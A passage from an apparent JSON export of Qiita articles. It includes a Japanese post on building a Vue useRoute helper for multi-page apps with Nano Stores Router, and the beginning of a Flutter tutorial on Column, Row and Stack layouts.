        },
        {
          "name": "C#",
          "versions": []
        },
        {
          "name": "プログラミング言語",
          "versions": []
        },
        {
          "name": "制御構文",
          "versions": []
        }
      ],
      "title": "【7言語比較】if文・for文の書き方と真偽値の違いで学ぶプログラミング言語の個性",
      "updated_at": "2025-12-09T14:13:33+09:00",
      "url": "https://qiita.com/izutani/items/d4161e45524636038d64",
      "user": {
        "description": null,
        "facebook_id": null,
        "followees_count": 0,
        "followers_count": 0,
        "github_login_name": "izoizo2000",
        "id": "izutani",
        "items_count": 12,
        "linkedin_id": null,
        "location": null,
        "name": "",
        "organization": null,
        "permanent_id": 3562533,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3562533/06ec78d2a7e72e63184695327f0b1c5c5a7c32d9/large.png?1739935183",
        "team_only": false,
        "twitter_screen_name": "izo614",
        "website_url": null
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<p data-sourcepos=\"1:1-1:54\"><iframe id=\"qiita-embed-content__299fdcbacd10d53c3364cdfba3a29849\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__299fdcbacd10d53c3364cdfba3a29849\" data-content=\"https%3A%2F%2Fzenn.dev%2Fcomm_vue_nuxt%2Farticles%2F4440a9c45feafd\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<div data-sourcepos=\"3:1-5:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"4:1-4:36\">ここから先はミラーです。</p>\n</div>\n</div>\n<p data-sourcepos=\"7:1-7:178\">MPA(マルチ・ページ・アプリケーション)でuseRouteを利用したくて、Vue Router のuseRouteライクなuseRouteを実装してみたので、紹介します。</p>\n<h1 data-sourcepos=\"9:1-9:15\">\n<span id=\"初期実装\" class=\"fragment\"></span><a href=\"#%E5%88%9D%E6%9C%9F%E5%AE%9F%E8%A3%85\"><i class=\"fa fa-link\"></i></a>初期実装</h1>\n<p data-sourcepos=\"10:1-11:93\">ブラウザからページのURLを取得し、正規表現を利用する等して、分解していました。<br>\n実装として綺麗ではなく、汎用性も低いので、コードは載せません。</p>\n<h1 data-sourcepos=\"13:1-13:75\">\n<span id=\"nano-stores--nano-stores-router--nano-stores-vue-を利用した実装\" class=\"fragment\"></span><a href=\"#nano-stores--nano-stores-router--nano-stores-vue-%E3%82%92%E5%88%A9%E7%94%A8%E3%81%97%E3%81%9F%E5%AE%9F%E8%A3%85\"><i class=\"fa fa-link\"></i></a>Nano Stores + Nano Stores Router + Nano Stores Vue を利用した実装</h1>\n<h2 data-sourcepos=\"15:1-15:14\">\n<span id=\"nano-stores\" class=\"fragment\"></span><a href=\"#nano-stores\"><i class=\"fa fa-link\"></i></a>Nano Stores</h2>\n<p data-sourcepos=\"16:1-16:40\"><iframe id=\"qiita-embed-content__8f5b4b2576bd3ecc5fb8d1fcb80e6cf3\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__8f5b4b2576bd3ecc5fb8d1fcb80e6cf3\" data-content=\"https%3A%2F%2Fgithub.com%2Fnanostores%2Fnanostores\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"18:1-18:147\">コンパクト(軽量)かつUIフレームワーク・ライブラリ非依存(Vue.js3/Vanila JS etcで利用可能)な状態管理ライブラリ</p>\n<h2 data-sourcepos=\"19:1-19:21\">\n<span id=\"nano-stores-router\" class=\"fragment\"></span><a href=\"#nano-stores-router\"><i class=\"fa fa-link\"></i></a>Nano Stores Router</h2>\n<p data-sourcepos=\"20:1-20:36\"><iframe id=\"qiita-embed-content__280f430e482cff1c8cb3543254610d6c\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__280f430e482cff1c8cb3543254610d6c\" data-content=\"https%3A%2F%2Fgithub.com%2Fnanostores%2Frouter\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"22:1-22:53\">Nano Stores用のルーティング・ライブラリ</p>\n<h2 data-sourcepos=\"23:1-23:18\">\n<span id=\"nano-stores-vue\" class=\"fragment\"></span><a href=\"#nano-stores-vue\"><i class=\"fa fa-link\"></i></a>Nano Stores Vue</h2>\n<p data-sourcepos=\"24:1-24:33\"><iframe id=\"qiita-embed-content__0d8dcfe9de49c28c69912c961864da84\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0d8dcfe9de49c28c69912c961864da84\" data-content=\"https%3A%2F%2Fgithub.com%2Fnanostores%2Fvue\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"26:1-26:74\">Vue.jsからNano Store を利用しやくするためのライブラリ。</p>\n<h2 data-sourcepos=\"28:1-28:27\">\n<span id=\"本題ルータ部分\" class=\"fragment\"></span><a href=\"#%E6%9C%AC%E9%A1%8C%E3%83%AB%E3%83%BC%E3%82%BF%E9%83%A8%E5%88%86\"><i class=\"fa fa-link\"></i></a>本題：ルータ部分</h2>\n<p data-sourcepos=\"29:1-29:31\">Nano Stores Router で実装。</p>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"31:1-38:3\">\n<div class=\"code-lang\"><span class=\"bold\">router.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">createRouter</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">@nanostores/router</span><span class=\"dl\">'</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">$router</span> <span class=\"o\">=</span> <span class=\"nf\">createRouter</span><span class=\"p\">(</span>\n  <span class=\"p\">{</span> <span class=\"na\">frame</span><span class=\"p\">:</span> <span class=\"dl\">'</span><span class=\"s1\">/frames/:id</span><span class=\"dl\">'</span> <span class=\"p\">},</span>\n  <span class=\"p\">{</span> <span class=\"na\">links</span><span class=\"p\">:</span> <span class=\"kc\">false</span> <span class=\"p\">}</span>\n<span class=\"p\">)</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"40:1-40:313\">Nano Stores Routerは(デフォルトで)リンク(aタグ)をトラッキングし画面遷移をNano Stores Routerでコントロールできるようにしていますが、MPAではこの挙動は不要なので、{ links: false } を設定して、リンクのトラッキングをオフにしています。</p>\n<h1 data-sourcepos=\"42:1-42:26\">\n<span id=\"本題useroute-実装\" class=\"fragment\"></span><a href=\"#%E6%9C%AC%E9%A1%8Cuseroute-%E5%AE%9F%E8%A3%85\"><i class=\"fa fa-link\"></i></a>本題：useRoute 実装</h1>\n<div class=\"code-frame\" data-lang=\"typescript\" data-sourcepos=\"44:1-59:3\">\n<div class=\"code-lang\"><span class=\"bold\">use-route.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">$router</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">./router.ts</span><span class=\"dl\">'</span>\n<span class=\"k\">import</span> <span class=\"p\">{</span> <span class=\"nx\">useStore</span> <span class=\"p\">}</span> <span class=\"k\">from</span> <span class=\"dl\">'</span><span class=\"s1\">@nanostores/vue</span><span class=\"dl\">'</span>\n\n<span class=\"k\">export</span> <span class=\"kd\">function</span> <span class=\"nf\">useRoute</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">router</span> <span class=\"o\">=</span> <span class=\"nf\">useStore</span><span class=\"p\">(</span><span class=\"nx\">$router</span><span class=\"p\">)</span>\n\n  <span class=\"kd\">const</span> <span class=\"nx\">params</span> <span class=\"o\">=</span> <span class=\"nx\">router</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">?.</span><span class=\"nx\">params</span>\n\n  <span class=\"kd\">const</span> <span class=\"nx\">query</span> <span class=\"o\">=</span> <span class=\"nx\">router</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">?.</span><span class=\"nx\">search</span>\n\n  <span class=\"kd\">const</span> <span class=\"nx\">path</span> <span class=\"o\">=</span> <span class=\"nx\">router</span><span class=\"p\">.</span><span class=\"nx\">value</span><span class=\"p\">?.</span><span class=\"nx\">path</span>\n\n  <span class=\"k\">return</span> <span class=\"p\">{</span> <span class=\"nx\">params</span><span class=\"p\">,</span> <span class=\"nx\">query</span><span class=\"p\">,</span> <span class=\"nx\">path</span> <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"61:1-61:11\">\n<span id=\"利用例\" class=\"fragment\"></span><a href=\"#%E5%88%A9%E7%94%A8%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>利用例</h1>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"63:1-69:3\"><div class=\"highlight\"><pre><code>import { useRoute } from './use-route.ts'\n\nconst route = useRoute()\nconst id: string = route.params?.id ?? ''\nconst refStr: string = route.query?.ref ?? ''\n</code></pre></div></div>\n<h1 data-sourcepos=\"71:1-71:11\">\n<span id=\"最後に\" class=\"fragment\"></span><a href=\"#%E6%9C%80%E5%BE%8C%E3%81%AB\"><i class=\"fa fa-link\"></i></a>最後に</h1>\n<p data-sourcepos=\"72:1-73:56\">Nano Stores はPiniaほど、Nano Stores RouterもVue Router ほど、多機能ではありませんが、コンパクト(軽量)なので、使いどころは多々？あるのではないか思います。<br>\nNano Stores、調べてみては如何でしょうか？</p>\n<p data-sourcepos=\"76:1-78:53\">PS: このuseRouteは自作Railsアプリ(レガシー版)のために実装しました。<br>\n<a href=\"https://github.com/asip/easel-legacy\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://github.com/asip/easel-legacy</a><br>\n<a href=\"https://qiita.com/asip2k25/items/8fd4a4d0f3ee515e0012\" class=\"autolink\" id=\"reference-088b24bd5567ced85b6a\">https://qiita.com/asip2k25/items/8fd4a4d0f3ee515e0012</a></p>\n",
      "body": "https://zenn.dev/comm_vue_nuxt/articles/4440a9c45feafd\n\n::: note warn\nここから先はミラーです。\n:::\n\nMPA(マルチ・ページ・アプリケーション)でuseRouteを利用したくて、Vue Router のuseRouteライクなuseRouteを実装してみたので、紹介します。\n\n#  初期実装\nブラウザからページのURLを取得し、正規表現を利用する等して、分解していました。\n実装として綺麗ではなく、汎用性も低いので、コードは載せません。\n\n#  Nano Stores + Nano Stores Router + Nano Stores Vue を利用した実装\n\n## Nano Stores\nhttps://github.com/nanostores/nanostores\n\nコンパクト(軽量)かつUIフレームワーク・ライブラリ非依存(Vue.js3/Vanila JS etcで利用可能)な状態管理ライブラリ\n## Nano Stores Router\nhttps://github.com/nanostores/router\n\nNano Stores用のルーティング・ライブラリ\n## Nano Stores Vue\nhttps://github.com/nanostores/vue\n\nVue.jsからNano Store を利用しやくするためのライブラリ。\n\n## 本題：ルータ部分\nNano Stores Router で実装。\n\n``` router.ts\nimport { createRouter } from '@nanostores/router'\n\nexport const $router = createRouter(\n  { frame: '/frames/:id' },\n  { links: false }\n)\n```\n\nNano Stores Routerは(デフォルトで)リンク(aタグ)をトラッキングし画面遷移をNano Stores Routerでコントロールできるようにしていますが、MPAではこの挙動は不要なので、{ links: false } を設定して、リンクのトラッキングをオフにしています。\n\n# 本題：useRoute 実装\n\n``` use-route.ts\nimport { $router } from './router.ts'\nimport { useStore } from '@nanostores/vue'\n\nexport function useRoute() {\n  const router = useStore($router)\n\n  const params = router.value?.params\n\n  const query = router.value?.search\n\n  const path = router.value?.path\n\n  return { params, query, path }\n}\n```\n\n# 利用例\n\n```\nimport { useRoute } from './use-route.ts'\n\nconst route = useRoute()\nconst id: string = route.params?.id ?? ''\nconst refStr: string = route.query?.ref ?? ''\n```\n\n# 最後に\nNano Stores はPiniaほど、Nano Stores RouterもVue Router ほど、多機能ではありませんが、コンパクト(軽量)なので、使いどころは多々？あるのではないか思います。\nNano Stores、調べてみては如何でしょうか？\n\n\nPS: このuseRouteは自作Railsアプリ(レガシー版)のために実装しました。\nhttps://github.com/asip/easel-legacy\nhttps://qiita.com/asip2k25/items/8fd4a4d0f3ee515e0012\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T15:21:38+09:00",
      "group": null,
      "id": "600802c7fc16560b3a7b",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Vue.js",
          "versions": []
        },
        {
          "name": "mpa",
          "versions": []
        },
        {
          "name": "Vue3",
          "versions": []
        }
      ],
      "title": "MPAでuseRoute",
      "updated_at": "2025-12-09T15:21:38+09:00",
      "url": "https://qiita.com/asip2k25/items/600802c7fc16560b3a7b",
      "user": {
        "description": "",
        "facebook_id": "asip2k25",
        "followees_count": 1,
        "followers_count": 36,
        "github_login_name": "asip",
        "id": "asip2k25",
        "items_count": 36,
        "linkedin_id": "",
        "location": "Kyotanabe Kyoto Japan ",
        "name": "Yasumasa Ashida",
        "organization": "",
        "permanent_id": 28877,
        "profile_image_url": "https://gravatar.com/avatar/743ca0c9b08521b8032a25ec8bd20d3d?d=https%3A%2F%2Fidenticons.github.com%2F8821368051493f5497eb23fa0f708dcd.png&r=x",
        "team_only": false,
        "twitter_screen_name": "asip2k25",
        "website_url": ""
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<div data-sourcepos=\"1:1-3:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"2:1-2:124\"><a href=\"https://qiita.com/advent-calendar/2025/everyday_flutter\">毎日Flutter生活 Advent Calendar 2025</a> の4日目です<img alt=\":muscle:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f4aa.png\" title=\":muscle:\" width=\"20\" loading=\"lazy\"></p>\n</div>\n</div>\n<p data-sourcepos=\"5:1-5:44\">こんにちは！tatata-keshiです<img alt=\":smiley:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f603.png\" title=\":smiley:\" width=\"20\" loading=\"lazy\"></p>\n<p data-sourcepos=\"7:1-7:88\">今回はFlutterでレイアウトを組む方法についてまとめてみました。</p>\n<div data-sourcepos=\"9:1-11:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"10:1-10:179\">この記事はFlutter歴1週間未満の人が書いています！間違がったことを記載していても寛大な心で教えていただけると幸いです<img alt=\":confounded:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f616.png\" title=\":confounded:\" width=\"20\" loading=\"lazy\"></p>\n</div>\n</div>\n<h2 data-sourcepos=\"13:1-13:9\">\n<span id=\"column\" class=\"fragment\"></span><a href=\"#column\"><i class=\"fa fa-link\"></i></a>Column</h2>\n<p data-sourcepos=\"14:1-15:88\">Columnは要素を縦に並べるレイアウトです。<br>\nCSSで言うと<code>display: flex; flex-direction: column;</code>のようなイメージです。</p>\n<p data-sourcepos=\"17:1-17:57\"><iframe id=\"qiita-embed-content__41a42211e1e31b13d8c1da96f73136f7\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__41a42211e1e31b13d8c1da96f73136f7\" data-content=\"https%3A%2F%2Fapi.flutter.dev%2Fflutter%2Fwidgets%2FColumn-class.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"19:1-19:13\">\n<span id=\"実装例\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E8%A3%85%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>実装例</h3>\n<div class=\"code-frame\" data-lang=\"dart\" data-sourcepos=\"21:1-42:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">class</span> <span class=\"nc\">HomePage</span> <span class=\"kd\">extends</span> <span class=\"n\">StatelessWidget</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"n\">HomePage</span><span class=\"p\">({</span><span class=\"k\">super</span><span class=\"o\">.</span><span class=\"na\">key</span><span class=\"p\">});</span>\n\n  <span class=\"nd\">@override</span>\n  <span class=\"n\">Widget</span> <span class=\"n\">build</span><span class=\"p\">(</span><span class=\"n\">BuildContext</span> <span class=\"n\">context</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">Scaffold</span><span class=\"p\">(</span>\n      <span class=\"nl\">appBar:</span> <span class=\"n\">AppBar</span><span class=\"p\">(</span><span class=\"nl\">title:</span> <span class=\"n\">Text</span><span class=\"p\">(</span><span class=\"s\">'ホームページ'</span><span class=\"p\">),</span> <span class=\"nl\">backgroundColor:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">greenAccent</span><span class=\"p\">),</span>\n      <span class=\"nl\">body:</span> <span class=\"n\">Container</span><span class=\"p\">(</span>\n        <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">grey</span><span class=\"p\">,</span>\n        <span class=\"nl\">child:</span> <span class=\"n\">Column</span><span class=\"p\">(</span>\n          <span class=\"nl\">children:</span> <span class=\"p\">[</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">home</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">blueAccent</span><span class=\"p\">),</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">favorite</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">redAccent</span><span class=\"p\">),</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">star</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">yellowAccent</span><span class=\"p\">)</span>\n          <span class=\"p\">],</span>\n        <span class=\"p\">),</span>\n      <span class=\"p\">)</span>\n    <span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"44:1-44:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2F98ff3d45-e86a-4fd7-88dd-0b8a045adb95.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=391f3c7ba85e15bbf64592e539e847c7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2F98ff3d45-e86a-4fd7-88dd-0b8a045adb95.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=391f3c7ba85e15bbf64592e539e847c7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2F98ff3d45-e86a-4fd7-88dd-0b8a045adb95.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=53bf0f7fe5633a97c0e3463db53ba90d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3945858/98ff3d45-e86a-4fd7-88dd-0b8a045adb95.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"47:1-47:6\">\n<span id=\"row\" class=\"fragment\"></span><a href=\"#row\"><i class=\"fa fa-link\"></i></a>Row</h2>\n<p data-sourcepos=\"49:1-50:96\">次に紹介するのはRowです。RowはColumnとは異なり横に要素を並べるレイアウトです。<br>\nCSSで言えば<code>display: flex; flex-direction: row</code>のような感じだと思っています。</p>\n<p data-sourcepos=\"52:1-52:54\"><iframe id=\"qiita-embed-content__f1c7017ce0d86280ee0fd1d6a853db3e\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__f1c7017ce0d86280ee0fd1d6a853db3e\" data-content=\"https%3A%2F%2Fapi.flutter.dev%2Fflutter%2Fwidgets%2FRow-class.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"54:1-54:13\">\n<span id=\"実装例-1\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E8%A3%85%E4%BE%8B-1\"><i class=\"fa fa-link\"></i></a>実装例</h3>\n<div class=\"code-frame\" data-lang=\"dart\" data-sourcepos=\"56:1-77:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">class</span> <span class=\"nc\">HomePage</span> <span class=\"kd\">extends</span> <span class=\"n\">StatelessWidget</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"n\">HomePage</span><span class=\"p\">({</span><span class=\"k\">super</span><span class=\"o\">.</span><span class=\"na\">key</span><span class=\"p\">});</span>\n\n  <span class=\"nd\">@override</span>\n  <span class=\"n\">Widget</span> <span class=\"n\">build</span><span class=\"p\">(</span><span class=\"n\">BuildContext</span> <span class=\"n\">context</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">Scaffold</span><span class=\"p\">(</span>\n      <span class=\"nl\">appBar:</span> <span class=\"n\">AppBar</span><span class=\"p\">(</span><span class=\"nl\">title:</span> <span class=\"n\">Text</span><span class=\"p\">(</span><span class=\"s\">'ホームページ'</span><span class=\"p\">),</span> <span class=\"nl\">backgroundColor:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">greenAccent</span><span class=\"p\">),</span>\n      <span class=\"nl\">body:</span> <span class=\"n\">Container</span><span class=\"p\">(</span>\n        <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">grey</span><span class=\"p\">,</span>\n        <span class=\"nl\">child:</span> <span class=\"n\">Row</span><span class=\"p\">(</span>\n          <span class=\"nl\">children:</span> <span class=\"p\">[</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">home</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">blueAccent</span><span class=\"p\">),</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">favorite</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">redAccent</span><span class=\"p\">),</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">star</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">yellowAccent</span><span class=\"p\">)</span>\n          <span class=\"p\">],</span>\n        <span class=\"p\">),</span>\n      <span class=\"p\">)</span>\n    <span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"79:1-79:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2Ff7a14025-6fe3-4691-8b17-12813b5f6102.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1b08860e29f9384a1d791d9399908392\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2Ff7a14025-6fe3-4691-8b17-12813b5f6102.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=1b08860e29f9384a1d791d9399908392\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3945858%2Ff7a14025-6fe3-4691-8b17-12813b5f6102.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=6ac779e12d85f35d3e57257a87a6729f 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3945858/f7a14025-6fe3-4691-8b17-12813b5f6102.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"81:1-81:182\">ちなみにこれらのレイアウトは<code>maxAxisAlignment</code>や<code>crossAxisAlignment</code>を用いて中央寄せや左右上下寄せといった設定を加えることができます。</p>\n<p data-sourcepos=\"83:1-83:73\">そのためCSSのFlexboxのような使用感で使えそうですね！</p>\n<h2 data-sourcepos=\"86:1-86:8\">\n<span id=\"stack\" class=\"fragment\"></span><a href=\"#stack\"><i class=\"fa fa-link\"></i></a>Stack</h2>\n<p data-sourcepos=\"88:1-88:188\">先述のColumnとRowがそれぞれy軸とx軸方向に要素を並べるレイアウトなのに対して、このStackはz軸方向に要素を並べるレイアウトになります。</p>\n<p data-sourcepos=\"90:1-90:176\">あまり要素を重ねるというのは個人的にイメージがついていないのですが、どのような使われ方が一般的なんでしょうかね<img alt=\":thinking:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f914.png\" title=\":thinking:\" width=\"20\" loading=\"lazy\"></p>\n<h3 data-sourcepos=\"92:1-92:13\">\n<span id=\"実装例-2\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E8%A3%85%E4%BE%8B-2\"><i class=\"fa fa-link\"></i></a>実装例</h3>\n<div class=\"code-frame\" data-lang=\"dart\" data-sourcepos=\"94:1-115:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">class</span> <span class=\"nc\">HomePage</span> <span class=\"kd\">extends</span> <span class=\"n\">StatelessWidget</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"n\">HomePage</span><span class=\"p\">({</span><span class=\"k\">super</span><span class=\"o\">.</span><span class=\"na\">key</span><span class=\"p\">});</span>\n\n  <span class=\"nd\">@override</span>\n  <span class=\"n\">Widget</span> <span class=\"n\">build</span><span class=\"p\">(</span><span class=\"n\">BuildContext</span> <span class=\"n\">context</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"k\">return</span> <span class=\"n\">Scaffold</span><span class=\"p\">(</span>\n      <span class=\"nl\">appBar:</span> <span class=\"n\">AppBar</span><span class=\"p\">(</span><span class=\"nl\">title:</span> <span class=\"n\">Text</span><span class=\"p\">(</span><span class=\"s\">'ホームページ'</span><span class=\"p\">),</span> <span class=\"nl\">backgroundColor:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">greenAccent</span><span class=\"p\">),</span>\n      <span class=\"nl\">body:</span> <span class=\"n\">Container</span><span class=\"p\">(</span>\n        <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">grey</span><span class=\"p\">,</span>\n        <span class=\"nl\">child:</span> <span class=\"n\">Stack</span><span class=\"p\">(</span>\n          <span class=\"nl\">children:</span> <span class=\"p\">[</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">home</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">blueAccent</span><span class=\"p\">),</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">favorite</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">redAccent</span><span class=\"p\">),</span>\n            <span class=\"n\">Icon</span><span class=\"p\">(</span><span class=\"n\">Icons</span><span class=\"o\">.</span><span class=\"na\">star</span><span class=\"p\">,</span> <span class=\"nl\">size:</span> <span class=\"mi\">100</span><span class=\"p\">,</span> <span class=\"nl\">color:</span> <span class=\"n\">Colors</span><span class=\"o\">.</span><span class=\"na\">yellowAccent</span><span class=\"p\">)</span>\n          <span class=\"p\">],</span>\n        <span class=\"p\">),</span>\n      <span class=\"p\">)</span>\n    <span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</code></pre></div></div>\n<p data-sourcepos=\"117:1-117:122\"><a 